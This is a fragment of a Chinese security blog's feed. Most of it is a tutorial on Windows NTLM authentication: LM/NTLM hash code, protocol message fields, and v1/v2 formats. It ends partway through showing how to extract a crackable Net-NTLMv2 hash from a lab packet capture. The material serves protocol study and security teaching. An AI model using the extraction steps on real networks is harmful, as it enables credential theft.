0622555e64e21d818459cdacd34f6ef4298cc8843fa54c5506d778d5166df0bdce7f548d7f2eedafafac3a89625ed8a1a82dbce01c848a8f0905ebb3c7426c6d924e01af6a33668101b60cc83cfabdf2c3894952c44b4ea7cb247dc65fb2ae9e20b31feaf9825f067b5dfc4cb2b8b5b9af4464041e880b09a48577ae0bb171a0e2b4daddaf7241eaa44a11b242f0b9af41689043907afea2b6fd71f68b2881cc40974dce19dfa6bf47b60a85ca695e49c8db78224ea2c8f06503a0eb6dfb8e6f66c0168de14b361ffe91ee3a359e825a40131be4e1a50a8566a045ff2d92e8353a7f1b8d9a9874943f188b386afbd6cdac37c31fd4e76464df35e3831fdb94b40654b39779cdfdf92f807352f75e04b4c885a23426735f0240d65ac361f8c1799a05b11661e5c91991e5558733d75712fd9bec139a1f16f65ff8094676982ad5b14e4f8723e8ecd1b56f52234e26a7ba1599139139b1f5ed31c23ad7d7eee0add745200c45c43b66176de4ec6bde7da64b1fcc56152c20986849ca90d1ba23d7200ecc73b4e1fa534f4a0760447920dfa4c66fcdac4ea46dbb73e49a73b9f5279e8e46e1cf0de237e9f26ca13c3b4c57b4c316ef564b84afb58274a5d5a2fa484f9cb4178ffc032999cc3163f7b382bbbdf504426b22e499c6fc31dbcfffcd9cb2c37076c456e41a748f34d54dda15819f665f007d421f936659355baf14dcee2e7aa3e78047fa4287bde3c7eb00ab13f92138b5c270e05cab58b8553a97c3952589131c8a408e31c8d88a56dc6541509cf6caf3aa7719bcc2c645c42759567b57bc740502ffca0470769773638cce4092004b647bf4120622d7d57a16afeb6c26b7c13d8323444658a8fa0efad9ba283830e1c90394a415c49ed271620e7f70d6f2d31134c6bf3d787b1aace1573db4e591404cd49c2897bbb23b4fd17a5308e9c5787817b4f5b981d9b7b8dce59a3674e843074ef35d411f2af3e6f8b206acbdfb1cfba2f200f223990e3c881e57faf0c20c7b5e646e346f236a18609f01990868fe2f0384f587ba6b35421acf64aea8e3ad6f4bc19a90d4195f680e86e5fe022bd921623a5b0cddb1aec805878567eb7c99ffadb60ad097c17b6b013497c7a67eaeb1fc3133b0655374a2ae67cb75bbd641126b79a25ea37a6132ddbf922f26fd5c7ba7511ac6cf0a8ea9254c9fa707b5b72c403cea71a741019ad010c78a1a7575c020435be4188301760bda453797f9455b1e9ef01b4d658167c8ee8d04b7e252108a18a34046707feacbe3f536a4c647ec6c3faf32fcd08a5093ad1a4f6e312d70c1deb31b097e717dfc7c02834d80bb2cd32c2e5edbbc09260c93790fde798022d87e46c0c1cb1aea04c1d84393c600558c57bed52373c7d7b227294cb1e3274fc7b6b04abd25c2400a99b7ddf3b34359a518567f4cfbb2ecc6a996f7971c71e8d82344bf3c52cce86219ad5239c63f6c9cda5626402e450e2649b431a1ac034ab96a1beb2372aefd2f99768dfee2d780b259b0ef1217cbb8d278d8927d2c02a5d3b666a9280d588d00af062dd8e7f0a3d0bece66c994fc6b7d4d67f9b4de76e328f3f6d883db33ecbb43543e55ee0b37bce413a4b6e5e24d25b4ec36c6ab1e95b1302bd2ca0ca2af45f828f93ebf53539c8e640d826e7edd1eb9226bc53724d6f8454c6b6619331dcf80ce937fddcd53d0d34e154a889fbbf213279357ebe35357697f36a09ef9c8f117df67de6b3f63190878abef9bf1fb1edc4ea79b114ba1f8099d0cacb4296c9b6bfedcbeb148b1434cdb9f4ddcb4400c5adbeef93003c9d78951740bf908fe8d4ebc7ddb3cf3f500f8a7a4537185b7dea9c85bb871e6da7af1514aeb64b261bab45b785a231879311da0c6cad4b602313096ca339b76d3f196399bebe66e90e39cabc7a809913ed8b6418c243996395e9259991734e439bcabf04435431f876fea4ca597602561309a30ce198d91b2efa304385495aca36bf1fbf629271f17895848f19987dd11f998ed76325b610649443a609636650b473726c3a8034804b85b3c8fc4fdc9caa25684cd4b9bc62ffa00bd1e396cc9cebde8c37a7152fd138d0e6f6761ce206d42a165c592ac8f31a326c03e7e53a9f47b973463a769e2c268c3049909bcee1ac569fefc0906c7cc23ecc6e0330ebb03e06a9b86d4437dbea6e555191088beb7e2f27213997b79b97134517aa1964ff793395790e59c92446040dc5cb9f1f2f85edc54f9cb72196c1b2a1a49af7a642f6d1620acfd4d7cddcad5e1a872bca07349be7e72c29825855cd1465217bf1a69b50a76a5da30f11f46454717de5d43e16ef0115ad9e2a35694e6d7b864650d1d159ee8cc2662d36e4740438a82ed4f9e8271b05cb33dd6accbf2ab47d56c3eabdcedd59a8bc38780bf46228b096832e681b41d26606283c9a93840c80ac75ff0c3a92f4b332f6aba3aa05d9bc1f56fa816c10fec123543f3043c8e0539f329964ac1bb9d9efeefcff53a8c9a08a874cdc9f4e6bb485150ab534f0fbab28bf9c60785a679b46a1401f59b0a3ac9f289d8ace317fee1bd05226894f7a7e8e7816daebb0efced48896ce98aea9d6779663c2dff5be5e4b4f30c913dd09296df69296c80458ff66250f0ad5d2a54252c18de97399c10040d4c0405cafd5369fa27b95089f3bba02d8e7929faaf9390a7f71ed8fc3b2db59e6a80fbb848a3b79e37768fec72d4ecb252b0e8154b581f39ac34df28bdd704c8a20fe5c9b5a26783bbf0f5aaf619da5e76cb41ca7a7235017e1b02402a63197473ab390d2726c0f8ad91852d222bfbe1c651d5c438bf0e1bcadff6aa7ee12e65042d3fc502a356dfc7f99ef21dc9f9e77d0a0d0f29beb501219f249b2e7bf93caa8915580e831edf771bda973b7c177d12d5a09b39987baf2a6e7467a38bebbc12cb42175b240d87e592ea1f1e03aa91052cd385fa23997c3fb56343c8f1ff0bb414c30b82c32f21ba56a9174776c2faebf0f502ee8c972fb03041c48b79394fa46531235fa5c46000c06f4c1fcfb1a43bbb150383f7827f1049c7503f66d04916ea9154a93d5bdbbe5cefc35a651d2dddde44b48e0a935a2ab21cfa160ccd58833e9ee04c1c066a92cd7c64ab0468d8b6dea86e4926ea084a28e9ee8f45cd5537b1bc92271dd363b2a961881f6aaf9d8df68ffc3f263f510a896ef38cdaeb4cf1001f1803f93a4ba96cdc2c07e722c7bc5dd32c4acfe1c370c9dbf040f8e7edfe9d62be1ef7fa2d01b7bd349e1956f264df3066017cadbfcfb021933ab263978d88b9ea5ed0b48f639a549ee10104fe60a074e6b5f98ba213d8049514169c98649bff491db85e8f5b638586bd9ba1845135865e041d5e51a14501edb25a00548e9d92395a710f2208543937e263a9e26141621f678b37dad977f2b7cae3e3948eb02b667af6cbe97a8f0a06ab235aa5f662068ab1fed2bf4969d6bbeb46866ecfe89d03b220ae6076323d117cb134c13072e4c229f9b69e5aa604135c24f450e3c4681ccf89b63c11192eac79786b7be87aaf0722fe03c75374363a0c90611f27eac84fc5eb8a71428d528cf503178aa302edd3b505e4973b3210a3a1027b475634115676860c2ceb75de763e6d86d0df156291d23ef3f2f16807ad5da4ba1478208eb465811e6b80e9609481cd1cd9e20e0f417023fcf24e2c74ddaeca59190f1d2161800521c805474e2439ef06b989bbe6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-wave">      <input class="hbe hbe-input-field hbe-input-field-wave" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-wave" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-wave">您好, 这里需要密码.</span>      </label>      <svg class="hbe hbe-graphic hbe-graphic-wave" width="300%" height="100%" viewBox="0 0 1200 60" preserveAspectRatio="none">        <path d="M0,56.5c0,0,298.666,0,399.333,0C448.336,56.5,513.994,46,597,46c77.327,0,135,10.5,200.999,10.5c95.996,0,402.001,0,402.001,0"></path>      </svg>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">这里有东西被加密了，需要输入密码查看哦。</summary>
    
    
    
    <category term="Technology" scheme="https://ghostasky.github.io/categories/Technology/"/>
    
    
    <category term="内网" scheme="https://ghostasky.github.io/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>NTLM认证</title>
    <link href="https://ghostasky.github.io/2022/05/23/NTML/"/>
    <id>https://ghostasky.github.io/2022/05/23/NTML/</id>
    <published>2022-05-22T16:00:00.000Z</published>
    <updated>2022-07-12T06:27:09.786Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>NTLM的东西在github之前写过，但是不够详细，这里重新再过一遍。</p><p>NTLM使用在Windows的工作组环境中，而kerberos则使用在域的情况下。</p><h1 id="lm-hash-ntlm-hash">LM hash &amp; NTLM hash</h1><p>在写NTLM认证之前先写下LM和NTLM。</p><p>hash密码格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Administrator:500:AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0:::</span><br><span class="line">用户名:SID:LM-Hash:NTML-Hash:::</span><br></pre></td></tr></table></figure><h2 id="lm-hash">LM Hash</h2><p>全称LAN Manager Hash, windows最早使用的加密算法。</p><p>LM Hash计算步骤：</p><ol type="1"><li>密码全部转换为大写，转换为16进制，14字节，不足用0补全。</li><li>分成两个7字节，每部分为56bit</li><li>每7bit分组，在后面加一个0bit，即每组8bit</li><li>上述两组，使用DES分别加密，key为：<code>KGS!@#$%</code></li><li>完成后，两组拼接，得到LM Hash</li></ol><p>代码实现：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">from</span> pyDes <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">DesEncrypt</span>(<span class="params"><span class="built_in">str</span>, Des_Key</span>):</span></span><br><span class="line">    k = des(binascii.a2b_hex(Des_Key), ECB, pad=<span class="literal">None</span>)</span><br><span class="line">    EncryptStr = k.encrypt(<span class="built_in">str</span>)</span><br><span class="line">    <span class="keyword">return</span> binascii.b2a_hex(EncryptStr)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">group_just</span>(<span class="params">length,text</span>):</span></span><br><span class="line">    <span class="comment"># text 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    text_area = re.findall(<span class="string">r&#x27;.&#123;%d&#125;&#x27;</span> % <span class="built_in">int</span>(length), text) <span class="comment"># [&#x27;0011000&#x27;, &#x27;1001100&#x27;, &#x27;1000110&#x27;, &#x27;0110011&#x27;, &#x27;0100001&#x27;, &#x27;1010100&#x27;, &#x27;1101100&#x27;, &#x27;0000000&#x27;]</span></span><br><span class="line">    text_area_padding = [i + <span class="string">&#x27;0&#x27;</span> <span class="keyword">for</span> i <span class="keyword">in</span> text_area] <span class="comment">#[&#x27;00110000&#x27;, &#x27;10011000&#x27;, &#x27;10001100&#x27;, &#x27;01100110&#x27;, &#x27;01000010&#x27;, &#x27;10101000&#x27;, &#x27;11011000&#x27;, &#x27;00000000&#x27;]</span></span><br><span class="line">    hex_str = <span class="string">&#x27;&#x27;</span>.join(text_area_padding) <span class="comment"># 0011000010011000100011000110011001000010101010001101100000000000</span></span><br><span class="line">    hex_int = <span class="built_in">hex</span>(<span class="built_in">int</span>(hex_str, <span class="number">2</span>))[<span class="number">2</span>:].rstrip(<span class="string">&quot;L&quot;</span>) <span class="comment">#30988c6642a8d800</span></span><br><span class="line">    <span class="keyword">if</span> hex_int == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        hex_int = <span class="string">&#x27;0000000000000000&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> hex_int</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">lm_hash</span>(<span class="params">password</span>):</span></span><br><span class="line">    <span class="comment"># 1. 用户的密码转换为大写，密码转换为16进制字符串，不足14字节将会用0来再后面补全。</span></span><br><span class="line">    pass_hex = password.upper().encode(<span class="string">&quot;hex&quot;</span>).ljust(<span class="number">28</span>,<span class="string">&#x27;0&#x27;</span>) <span class="comment">#3132333435360000000000000000</span></span><br><span class="line">    <span class="built_in">print</span>(pass_hex) </span><br><span class="line">    <span class="comment"># 2. 密码的16进制字符串被分成两个7byte部分。每部分转换成比特流，并且长度位56bit，长度不足使用0在左边补齐长度</span></span><br><span class="line">    left_str = pass_hex[:<span class="number">14</span>] <span class="comment">#31323334353600</span></span><br><span class="line">    right_str = pass_hex[<span class="number">14</span>:] <span class="comment">#00000000000000</span></span><br><span class="line">    left_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(left_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00110001001100100011001100110100001101010011011000000000</span></span><br><span class="line">    right_stream = <span class="built_in">bin</span>(<span class="built_in">int</span>(right_str, <span class="number">16</span>)).lstrip(<span class="string">&#x27;0b&#x27;</span>).rjust(<span class="number">56</span>, <span class="string">&#x27;0&#x27;</span>) <span class="comment"># 00000000000000000000000000000000000000000000000000000000</span></span><br><span class="line">    <span class="comment"># 3. 再分7bit为一组,每组末尾加0，再组成一组</span></span><br><span class="line">    left_stream = group_just(<span class="number">7</span>,left_stream) <span class="comment"># 30988c6642a8d800</span></span><br><span class="line">    right_stream = group_just(<span class="number">7</span>,right_stream) <span class="comment"># 0000000000000000</span></span><br><span class="line">    <span class="comment"># 4. 上步骤得到的二组，分别作为key 为 &quot;KGS!@#$%&quot;进行DES加密。</span></span><br><span class="line">    left_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,left_stream) <span class="comment">#44efce164ab921ca</span></span><br><span class="line">    right_lm = DesEncrypt(<span class="string">&#x27;KGS!@#$%&#x27;</span>,right_stream) <span class="comment"># aad3b435b51404ee</span></span><br><span class="line">    <span class="comment"># 5. 将加密后的两组拼接在一起，得到最终LM HASH值。</span></span><br><span class="line">    <span class="keyword">return</span> left_lm + right_lm</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">hash</span> = lm_hash(<span class="string">&quot;aaaaa&quot;</span>)</span><br></pre></td></tr></table></figure><p>上述LM Hash有一些问题：</p><ol type="1"><li>密码长度不超过14字节</li><li>不区分大小写</li><li>长度小于7位的话，后半部分唯一确定:<code>aad3b435b51404ee</code></li><li>14字节转化为2*7，降低了复杂度，即7字节DES的2倍</li><li>DES强度低</li><li>key固定</li></ol><h2 id="ntlm-hash">NTLM Hash</h2><p>为解决上述问题，微软在1993年的Windows NT 3.1引入NTLM Hash，下面为各Windows对LM和NTLM的支持：</p><table><thead><tr class="header"><th></th><th>2000</th><th>XP</th><th>2003</th><th>Vista</th><th>Win7</th><th>2008</th><th>Win8</th><th>2012</th></tr></thead><tbody><tr class="odd"><td>LM</td><td>√</td><td>√</td><td>√</td><td></td><td></td><td></td><td></td><td></td></tr><tr class="even"><td>NTLM</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td><td>√</td></tr></tbody></table><p>其中，在Win 2000/XP/2003中，长度不超过14的话，依旧使用LM，超过的话使用NTLM。</p><p>在Vista开始，默认只存储NTLM Hash，不存LM Hash(LM Hash固定<code>AAD3B435B51404EEAAD3B435B51404EE</code>，NULL之后运算的结果)，有些工具的格式固定，需要填写LM Hash，0填充即可。LM Hash的位置依旧存在，只不过没有价值。</p><p>NTLM Hash计算步骤：</p><ol type="1"><li>转16进制</li><li>Unicode编码，就是加00</li><li>使用MD4对Unicode进行hash</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import hashlib,binascii; print binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;p@Assword!123&quot;.encode(&quot;utf-16le&quot;)).digest())&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="ntlm身份认证">NTLM身份认证</h1><p>分为本地认证和网络认证</p><h2 id="本地认证">本地认证</h2><p>Windows在保存密码的时候，保存的不是密码的明文，而是密码的hash。</p><p>保存的位置：<code>%SystemRoot%\system32\config\sam</code></p><p>SAM文件中保留了计算机本地所有用户的凭证信息，可以理解为是一个数据库</p><figure><img src="/2022/05/23/NTML/image-20220523145537700.png" alt="image-20220523145537700"><figcaption aria-hidden="true">image-20220523145537700</figcaption></figure><p>当登陆的时候，系统读SAM文件中内容与输入的比较，相同则认证成功。</p><p>认证流程：<code>winlogon.exe --&gt; 用户输入 --&gt; lsass.exe（认证）</code></p><p>用户注销、重启、锁屏后，系统会让<code>winlogon.exe</code>显示登陆界面，之后用户输入，得到输入后交给lsass进程，将明文加密为NTLM后，与SAM中的内容进行比较。</p><p>lsass：用于微软Windows系统的安全机制，用于本地安全和登陆策略。</p><h2 id="网络认证">网络认证</h2><p>上面是本地认证，下面这里来写网络认证。</p><p>NTLM是一种网络认证协议，它是基于挑战（Challenge）/响应（Response）认证机制的一种认证模式。这个协议只支持Windows。</p><p>由三种消息组成，即三步：</p><ol type="1"><li>协商type1：协商确定协议版本，重要的是用户名</li><li>质询type2：挑战/响应起作用的范畴，重要的是challenge，服务端生成</li><li>身份验证type3：质询完成后的验证，重要的是response，客户端生成，又称为<code>Net NTLM Hash</code>，用户NTLM Hash计算challenge的结果</li></ol><p>在工作组中完整流程：</p><ol type="1"><li><p>用户名/密码登陆客户端</p></li><li><p>客户端将密码进行hash存储，丢弃密码明文。客户端发送协商消息type1(NEGOTIATE)，包含客户端支持和服务端请求的功能列表，请求还包含用户名、机器以及需要使用的安全服务等信息。</p></li><li><p>服务端使用type2(质询)消息进行响应，包含服务端支持和同意的功能列表。其中最重要的是服务端生成的challenge，即服务端随机生成的16位随机数。</p></li><li><p>客户端收到上述响应后，发送type3(验证)消息。用户收到上述响应后，使用用户NTLM Hash加密challenge，得到response，发送的验证消息包含[response，username，challenge]。</p><p>这里NTLM Hash计算challenge的结果在网络协议中成为<code>Net NTLM Hash</code>。</p></li><li><p>服务端拿到type3(验证)消息后，服务端使用用户的NTLM Hash加密challenge，得到response1，将其与客户端发送的response进行比较验证。</p></li></ol><p>上述是在工作组中的流程，下面是在域中的流程，前4步是一样的，只有最后一步不一样，分为两步：</p><ol start="5" type="1"><li>服务端拿到type3(验证)消息后，服务端使用用户的NTLM Hash(如果服务端有的话)加密challenge，得到response1，将其与客户端发送的response进行比较验证。如果服务端本地没有该用户NTLM Hash的话，也就计算不了response1，这时服务端使用netlogon协议联系域控，建立好安全通道后，将type1,type2,type3一起发送给域控(这个过程也叫作Pass Through Authentication认证流程)</li><li>域控使用challenge和用户NTLM Hash计算并与response比较验证。</li></ol><h2 id="三个过程">三个过程</h2><h3 id="协商type1">协商type1</h3><p>每个字段的含义见微软文档：https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/b34032e5-3aae-4bc6-84c3-c6d80eadf7f2</p><table><colgroup><col style="width: 23%"><col style="width: 76%"></colgroup><thead><tr class="header"><th style="text-align: left;">字段</th><th style="text-align: left;">含义</th></tr></thead><tbody><tr class="odd"><td style="text-align: left;">Signature</td><td style="text-align: left;">签名，一个 8 字节字符数组，必须包含 ASCII 字符串（'N'、'T'、'L'、'M'、'S'、'S'、'P'、'\0 '）</td></tr><tr class="even"><td style="text-align: left;">MessageType</td><td style="text-align: left;">消息类型，必须为0x00000001</td></tr><tr class="odd"><td style="text-align: left;">NegotiateFlags</td><td style="text-align: left;">包含一组<strong>NEGOTIATE</strong>结构</td></tr><tr class="even"><td style="text-align: left;">DomainNameFields</td><td style="text-align: left;">包含域名信息字段。</td></tr><tr class="odd"><td style="text-align: left;">WorkstationFields</td><td style="text-align: left;">包含<strong>WorkstationName</strong>信息字段</td></tr><tr class="even"><td style="text-align: left;">Version</td><td style="text-align: left;">版本</td></tr><tr class="odd"><td style="text-align: left;">Payload (variable)</td><td style="text-align: left;"></td></tr></tbody></table><h3 id="质询type2">质询type2</h3><p>详细字段信息见微软文档：https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/801a4681-8809-4be9-ab0d-61dcfe762786</p><p>质询的信息重要的就是服务端产生的challenge</p><table><thead><tr class="header"><th>字段</th><th>含义</th></tr></thead><tbody><tr class="odd"><td>Signature</td><td>签名，同上</td></tr><tr class="even"><td>MessageType</td><td>消息类型，必须为0x00000002</td></tr><tr class="odd"><td>TargetNameFields</td><td>包含<strong>TargetName</strong>信息的字段</td></tr><tr class="even"><td>NegotiateFlags</td><td>包含一组<strong>NEGOTIATE</strong>结构</td></tr><tr class="odd"><td>ServerChallenge</td><td>包含NTLM质询的8字节</td></tr><tr class="even"><td>Reserved</td><td>一个 8 字节数组，其元素在发送时必须为零，并且在接收时必须被忽略。</td></tr><tr class="odd"><td>TargetInfoFields</td><td>包含<strong>TargetInfo</strong>信息的字段</td></tr><tr class="even"><td>Version</td><td>版本</td></tr><tr class="odd"><td>Payload (variable)</td><td></td></tr></tbody></table><p>示例：</p><figure><img src="/2022/05/23/NTML/t017f0ae4b36b11e5ae.png" alt="img"><figcaption aria-hidden="true">img</figcaption></figure><h3 id="身份验证type3">身份验证type3</h3><p>详细字段信息见微软文档：https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/033d32cc-88f9-4483-9bf2-b273055038ce</p><table><colgroup><col style="width: 34%"><col style="width: 65%"></colgroup><thead><tr class="header"><th>字段</th><th>含义</th></tr></thead><tbody><tr class="odd"><td>Signature</td><td>签名，同上</td></tr><tr class="even"><td>MessageType</td><td>消息类型，必须为0x00000003</td></tr><tr class="odd"><td>LmChallengeResponseFields</td><td>包含<strong>LmChallengeResponse</strong>信息的字段</td></tr><tr class="even"><td>NtChallengeResponseFields</td><td>包含<strong>NtChallengeResponse</strong>信息的字段</td></tr><tr class="odd"><td>DomainNameFields</td><td>包含<strong>DomainName</strong>信息的字段</td></tr><tr class="even"><td>UserNameFields</td><td>包含<strong>UserName</strong> 信息的字段</td></tr><tr class="odd"><td>WorkstationFields</td><td>包含<strong>Workstation</strong>信息的字段</td></tr><tr class="even"><td>EncryptedRandomSessionKeyFields</td><td>包含<strong>EncryptedRandomSessionKey</strong>信息的字段</td></tr><tr class="odd"><td>NegotiateFlags</td><td></td></tr><tr class="even"><td>Version</td><td></td></tr><tr class="odd"><td>MIC (16 bytes)</td><td>NTLM NEGOTIATE_MESSAGE、CHALLENGE_MESSAGE 和 AUTHENTICATE_MESSAGE 的消息完整性</td></tr><tr class="even"><td>Payload (variable)</td><td></td></tr></tbody></table><h1 id="ntlm-v1v2协议">NTLM v1/v2协议</h1><h2 id="ntlm与ntlm-v1v2与net-ntlm-v1v2区别">NTLM与NTLM v1/v2与Net NTLM v1/v2区别</h2><p>首先是NTLM，就是最上面的那个，例子：<code>AAD3B435B51404EEAAD3B435B51404EE:31D6CFE0D16AE931B73C59D7E0C089C0</code></p><p>而<code>NTLM v1/v2</code>与NTLM不一样，<code>NTLM v1/v2</code>是<code>Net NTLM v1/v2</code>的缩写，也就是说他俩才是一回事。Net NTLM用于网络身份验证，就是上面那个challenge/response认证的那个，下面举个NTLM v2的例子，来源<a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat</a>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin::N46iSNekpT:08ca45b7d7ea58ee:88dcbe4446168966a153a0064958dac6:5c7830315c7830310000000000000b45c67103d07d7b95acd12ffa11230e0000000052920b85f78d013c31cdb3b92f5d765c783030 </span><br></pre></td></tr></table></figure><h2 id="ntlm-v1v2">NTLM v1/v2</h2><p>NTLM v2是在Windows NT4.0 SP4中引入的，与NTLM v1的区别是challenge和hash算法不同，相同点是使用的都是NTLM Hash</p><ul><li>challenge<ul><li>NTLM v1：8byte</li><li>NTLM v2：16byte</li></ul></li><li>Net NTLM Hash<ul><li>v1：DES</li><li>v2：HMAC-MD5</li></ul></li></ul><p>NTLM v1格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::hostname:LM response:NTLM response:challenge</span><br></pre></td></tr></table></figure><p>NTML v2格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># NTLM</span><br><span class="line"></span><br><span class="line">C = 8-byte server challenge, random</span><br><span class="line">K1 | K2 | K3 = NTLM-Hash | 5-bytes-0</span><br><span class="line">response = DES(K1,C) | DES(K2,C) | DES(K3,C)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># NTLM v2</span><br><span class="line"></span><br><span class="line">SC = 8-byte server challenge, random</span><br><span class="line">CC = 8-byte client challenge, random</span><br><span class="line">CC* = (X, time, CC2, domain name)</span><br><span class="line">v2-Hash = HMAC-MD5(NT-Hash, user name, domain name)</span><br><span class="line">LMv2 = HMAC-MD5(v2-Hash, SC, CC)</span><br><span class="line">NTv2 = HMAC-MD5(v2-Hash, SC, CC*)</span><br><span class="line">response = LMv2 | CC | NTv2 | CC*</span><br></pre></td></tr></table></figure><h2 id="response提取ntlm-v2">Response提取NTLM v2</h2><p>这里就不搭建了，使用的<a href="https://3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-NTLM-hash%E5%92%8CNet-NTLM-hash%E4%BB%8B%E7%BB%8D">3gstudent师傅</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Server</span><br><span class="line">IP:192.168.62.139</span><br><span class="line">username:a</span><br><span class="line">password:test123</span><br><span class="line">Client</span><br><span class="line">IP:192.168.62.130</span><br></pre></td></tr></table></figure><p>客户端连接服务端：</p><p><code>net use \\192.168.52.139 /u:a test123</code></p><p>抓包：</p><figure><img src="/2022/05/23/NTML/2-3.png" alt="Alt text"><figcaption aria-hidden="true">Alt text</figcaption></figure><p>前4个对应的就是NTLM认证的几个步骤，第二个查看数据包，其中的challenge：<code>c0b5429111f9c5f4</code></p><figure><img src="/2022/05/23/NTML/2-4.png" alt="Alt text"><figcaption aria-hidden="true">Alt text</figcaption></figure><p>查看第三个数据包得到客户端加密的challenge：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">challenge:a9134eee81ca25de</span><br><span class="line"></span><br><span class="line">response:a5f1c47844e5b3b9c6f67736a2e1916d:0101000000000000669dae86ba8bd301a9134eee81ca25de0000000002001e00570049004e002d003100550041004200430047004200470049005500330001001e00570049004e002d003100550041004200430047004200470049005500330004001e00570049004e002d003100550041004200430047004200470049005500330003001e00570049004e002d003100550041004200430047004200470049005500330007000800669dae86ba8bd30106000400020000000800300030000000000000000000000000300000e9d9e613613097d1e2f47c1fd97fa099f65dfd78075d8bdb5ca162492ea5d2990a001000000000000000000000000000000000000900260063006900660073002f003100390032002e003100360038002e00360032002e00310033003900000000000000000000000000</span><br></pre></td></tr></table></figure><figure><img src="/2022/05/23/NTML/2-5.png" alt="Alt text"><figcaption aria-hidden="true">Alt text</figcaption></figure><p>其中NTLM v2格式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username::domain:challenge:HMAC-MD5:blob</span><br></pre></td></tr></table></figure><ul><li><p>domain可由数据包获得</p></li><li><p>HMAC-MD5对应数据包中的NTProofStr，见上图。</p></li><li><p>blob对应数据包中Response去掉NTProofStr的后半部分</p></li></ul><p>完整NTLM v2的数据：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 